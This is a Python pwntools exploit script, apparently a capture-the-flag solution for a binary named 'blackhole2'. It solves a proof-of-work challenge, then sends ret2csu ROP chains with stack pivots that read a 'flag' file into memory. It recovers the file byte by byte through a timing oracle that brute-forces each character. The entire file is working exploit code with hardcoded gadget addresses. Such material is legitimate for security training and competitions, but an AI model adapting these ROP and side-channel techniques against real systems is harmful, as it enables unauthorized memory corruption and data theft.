from  pwn import *
import random, string, subprocess, os, sys
from hashlib import sha256
import time
dicti='asdfghjklqwertyuiop1234567890zxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM_\{\} ~!@#$%^&*()+`-=|[]\:";\'<>?,./'


# context(log_level='debug')
# p=process('./blackhole2')

# # p=remote('localhost',1234)
def proof_of_work():
	chal=p.recv(16)
	sol = ''.join(random.choice(string.letters+string.digits) for _ in xrange(4))
	while not sha256(chal + sol).hexdigest().startswith('0000'):
		sol = ''.join(random.choice(string.letters+string.digits) for _ in xrange(4))
	p.send(sol)


# gdb.attach(p,'b *0x400a2a\nb *0x400720\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc')
# gdb.attach(p,'b *0x400a2a\nb *0x400720\nc')
def ret2csu(rbx,rbp,r12,r13_rdx,r14_rsi,r15_rdi):
	s=p64(0x400a2a)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13_rdx)+p64(r14_rsi)+p64(r15_rdi)
	s=s+p64(0x400A10) #	call    qword ptr [r12+rbx*8]
	return s
def calc(rbp,ret):
	if ret>(rbp-1)*8:
		return ret-(rbp-1)*8
	else:
		return (~((ret-(rbp-1)*8)-1)^(2**64-1))+1
def pop_rdi(rdi):
	return p64(0x400a33)+p64(rdi)
def pop_rsi_r15(rsi,r15):
	return p64(0x400a31)+p64(rsi)+p64(r15)
def leave_ret():
	return p64(0x400985)
def pop_rbp(rbp):
	return p64(0x4007c0)+p64(rbp)
def pop_rbp():
	return p64(0x4007c0)
def pop_rsp_r13_r14_r15(rsp,r13,r14,r15):
	return p64(0x400a2d)+p64(rsp)+p64(r13)+p64(r14)+p64(r15)
def infinite_loop():
	return ret2csu(0x400a1d,safe_bss,calc(0x400a1d+1,safe_bss-0x100+0x10),trash_place,0x0,safe_bss-0x100)

solve=''
i=0
while True:
	info("The %d byte"%i)
	suc=False
	for char in dicti:
		p=process('./pow.py')
		proof_of_work()
		safe_bss=0x00601800
		trash_place=safe_bss+0x700
		flag_buf=0x601c08
		read_plt=0x400730
		alarm_plt=0x400720
		ret=0x4006b9
		sendstr=''


		payload='a'*0x20+p64(safe_bss)+\
				pop_rdi(0)+pop_rsi_r15(safe_bss-0x100,0)+p64(read_plt)+\
				pop_rdi(0)+pop_rsi_r15(safe_bss,0)+p64(read_plt)+\
				p64(0x400985)
		sendstr=sendstr+payload.ljust(0x100,'\x00')
		# p.send(payload.ljust(0x100,'\x00'))
		sendstr=sendstr+('flag\x00\x00\x00\x00'+p64(alarm_plt)+p64(0x400730)*7+p64(0x400a26)).ljust(0x100,'\x00')
		# p.send(('flag\x00\x00\x00\x00'+p64(alarm_plt)).ljust(0x100,'\x00'))

		payload=p64(read_plt)+ret2csu(safe_bss-1,safe_bss,calc(safe_bss,safe_bss),0x1,0x601040,0)+\
				ret2csu(safe_bss-1+0x100,safe_bss+0x100,calc(safe_bss+0x100,safe_bss),0x500,safe_bss+0x100,0)+\
				p64(0)*2+p64(safe_bss+0x100)+p64(0)*4+leave_ret()
				


		sendstr=sendstr+payload.ljust(0x100,'\x00')+'\x05'
		# p.send(payload.ljust(0x100,'\x00'))
		# p.send('\x05')

		# 0x400828 : add byte ptr [rcx], al ; ret
		payload=p64(read_plt)+\
				ret2csu(safe_bss-1,safe_bss,calc(safe_bss,safe_bss),0x2,trash_place,0)+\
				ret2csu(safe_bss-1,safe_bss,calc(safe_bss,safe_bss-0x100+8),trash_place,0x0,safe_bss-0x100)+\
				ret2csu(safe_bss-1,safe_bss,calc(safe_bss,safe_bss),i,trash_place,3)+\
				ret2csu(safe_bss-1,safe_bss,calc(safe_bss,safe_bss),0x1,flag_buf,3)+\
				ret2csu(safe_bss-1,safe_bss,calc(safe_bss,safe_bss),0x3,trash_place,0)+\
				ret2csu(safe_bss-1,safe_bss,calc(safe_bss,safe_bss-0x100+8),trash_place,0x0,safe_bss-0x100)+\
				ret2csu(safe_bss-1,safe_bss,calc(safe_bss,safe_bss),0,0,3)+\
				ret2csu(safe_bss-1,safe_bss,calc(safe_bss,safe_bss),0x2,trash_place,0)+\
				ret2csu(safe_bss-1,safe_bss,calc(safe_bss,safe_bss-0x100+8),trash_place,0x0,safe_bss-0x100)+\
				ret2csu(safe_bss-1,safe_bss,calc(safe_bss,safe_bss),i,trash_place,4)+\
				ret2csu(safe_bss-1,safe_bss,calc(safe_bss,safe_bss),0x0,flag_buf+8,4)+\
				p64(0)*7+p64(0x400a2a)+p64(0xffffffffffffffff)+p64(0xffffffffffffff00|ord(char))+p64(0)*4+p64(0x400a21)+p64(0)*7+\
				ret2csu(safe_bss-1,safe_bss,calc(safe_bss,safe_bss-0x100+0x10),0x400-0x10,safe_bss,0)+\
				ret2csu(safe_bss-1,safe_bss,calc(safe_bss,safe_bss-0x100+0x10),0x400-0x10,safe_bss,0)+\
				ret2csu(safe_bss-1,safe_bss,calc(safe_bss,safe_bss-0x100+0x10),0x400-0x10,safe_bss,0)+\
				ret2csu(safe_bss-1,safe_bss,calc(safe_bss,safe_bss-0x100+0x10),0x400-0x10,safe_bss,0)



				# //infinite_loop()



		sendstr=sendstr+payload.ljust(0x500,'\x00')+'a'*2+'a'*3+'\x00'

		# time_start=time.time()
		p.send(sendstr.ljust(0x1000,'\x00'))
		# p.send(payload.ljust(0x500,'\x00'))
		# p.send('a'*2)
		# p.recv()
		try:
			p.recv(1)
			p.recv(1,timeout=1)
			solve=solve+char
			suc=True
			print "success for char:%s"%char
			print "\nCurrent solve:%s\n"%solve
			p.close()
			break
		except Exception as e:
			print "failed for char:%s"%char
			p.close()
		
			# time_end=time.time()
	if not suc:
		print "\n[*] Finished!"
		break
	else:
		i=i+1
		# print time_end-time_start
# p.interactive()
print solve